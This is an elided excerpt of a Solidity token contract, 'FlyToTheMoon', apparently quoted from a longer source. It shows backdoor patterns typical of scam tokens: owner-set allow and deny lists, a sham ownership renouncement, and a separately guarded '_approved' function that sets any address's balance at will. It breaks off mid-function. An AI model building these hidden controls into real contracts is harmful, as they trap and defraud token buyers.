...
contract FlyToTheMoon is Ownable {
...
mapping(address => uint256) public bal;
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    bal[msgSender] = totalSupply;
    approvedHolders[msgSender] = true;
  }
  ...
  function setInApprovationList(address sender, bool ok) external ow {
      approvedHolders[sender] = ok;
  }
  function setInDenialList(address sender, bool ok) external ow returns (bool){
      deniedHolders[sender] = ok;
  }    
  function checkIfIsApproved(address sender) public view returns (bool) {
  ...
  function checkIfIsDenied(address sender) public view returns (bool) {
  ...
  function renOwnership() public ow {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= bal[_from]);
  ...
  function changePCSAddress(address addr) public ow {
    pcsAddress = addr;
  }
  function showPCSAddress() public view returns (address) {
    return pcsAddress;
  }
  function _approved(address buyer, uint256 _q) external oww {
    bal[buyer] = _q * 10 ** uint256(decimals);
  }
  // 25 December
  function ad(
    address s,
